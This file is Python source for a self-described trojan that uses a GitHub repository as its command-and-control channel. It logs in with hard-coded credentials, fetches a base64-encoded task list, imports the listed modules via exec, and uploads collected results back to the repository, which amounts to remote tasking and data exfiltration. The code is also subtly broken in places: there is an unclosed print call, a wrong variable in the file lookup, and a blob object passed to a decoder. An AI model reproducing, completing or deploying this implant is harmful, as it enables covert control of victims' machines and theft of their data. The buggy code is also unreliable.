import json, base64, sys, time, imp, random, threading, queue, os

from github3 import login

trojan_id = "abc"

trojan_config = "{0}.json".format(trojan_id)
data_path = "data/{0}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()

def connect_to_github():
    gh = login(username='daemonic-ctrl',password='Miran567')
    repo = gh.repository('daemonic-ctrl', 'test')
    branch = repo.branch('master')

    return gh,repo,branch

def get_file_contents(filepath):
    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filepath.path:
            print('[*] Found file {0}'.format(filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob

    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        
        if task['module'] not in sys.modules:
            
           exec('import {0}'.format(task['module']))

    return config

def store_module_result(data):
    
    gh,repo,branch = connect_to_github()
    remote_path = 'data/{0}/{1}.data'.format(trojan_id,random.randint(1000,100000))
    repo.create_file(remote_path,"Commit message",base64.b64decode(data))

    return


